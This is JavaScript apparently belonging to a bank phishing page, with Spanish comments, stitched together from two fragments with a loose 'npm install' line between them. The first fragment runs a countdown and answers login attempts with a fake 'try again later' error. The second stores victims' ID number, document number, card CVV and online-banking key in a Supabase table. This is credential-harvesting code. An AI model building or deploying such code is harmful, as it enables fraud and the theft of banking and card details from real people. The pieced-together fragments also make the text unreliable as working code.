document.addEventListener('DOMContentLoaded', () => {
    // Temporizador
    let countdownElement = document.getElementById('countdown');
    let timeLeft = 300; // Tiempo en segundos

    function updateTimer() {
        countdownElement.textContent = timeLeft;
        timeLeft -= 1;

        if (timeLeft < 0) {
            clearInterval(timerInterval);
            countdownElement.textContent = '0';
        }
    }

    let timerInterval = setInterval(updateTimer, 1000);

    // Manejo del formulario
    document.getElementById('login-form').addEventListener('submit', (event) => {
        event.preventDefault();
        alert('Error: Intente más tarde.');
    });
});
npm install @supabase/supabase-js
import { createClient } from '@supabase/supabase-js';

// Obtén las variables de entorno desde el entorno de ejecución
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_KEY;
const supabase = createClient(supabaseUrl, supabaseKey);

// Función para insertar datos en la base de datos
async function insertData(dni, documentNumber, cvv, remember, internetKey) {
    const { data, error } = await supabase
        .from('users')
        .insert([{ dni, document_number: documentNumber, cvv, remember, internet_key: internetKey }]);

    if (error) {
        console.error('Error:', error);
        return null;
    } else {
        console.log('Data inserted:', data);
        return data;
    }
}

// Llama a la función con datos de ejemplo
insertData('12345678', '1234567890', '123', true, '123456');
